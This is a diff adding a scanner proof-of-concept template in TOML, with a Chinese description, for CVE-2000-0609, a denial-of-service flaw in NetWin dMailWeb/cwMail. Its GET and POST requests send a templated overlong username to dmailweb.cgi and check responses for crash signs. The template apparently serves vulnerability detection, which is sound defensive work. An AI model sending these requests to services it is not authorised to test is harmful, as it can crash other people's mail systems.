@@ -1,0 +1,65 @@
+[info]
+author = "AVE"
+description = "NetWin dMailWeb 和 cwMail 2.6g 及更早版本存在拒绝服务漏洞，远程攻击者通过向 username 参数传递超长字符串可导致服务崩溃。发送包含超长 username 参数的 HTTP 请求，若服务返回 500 错误或连接断开则判定存在漏洞。"
+id = "POC-AVE-2000-0730"
+name = "NetWin dMailWeb/cwMail 超长用户名参数拒绝服务 PoC"
+severity = "medium"
+tags = [
+    "cve-2000-0609",
+    "dos",
+    "netwin",
+    "dmailweb",
+    "cwmail",
+]
+vuln_id = [
+    "CVE-2000-0609",
+    "AVE-2000-0730",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/dmailweb.cgi?username={{long_username}}"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "500",
+    "Service Unavailable",
+    "Connection refused",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/dmailweb.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "username={{long_username}}&password=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "500",
+    "Service Unavailable",
+    "Connection refused",
+]
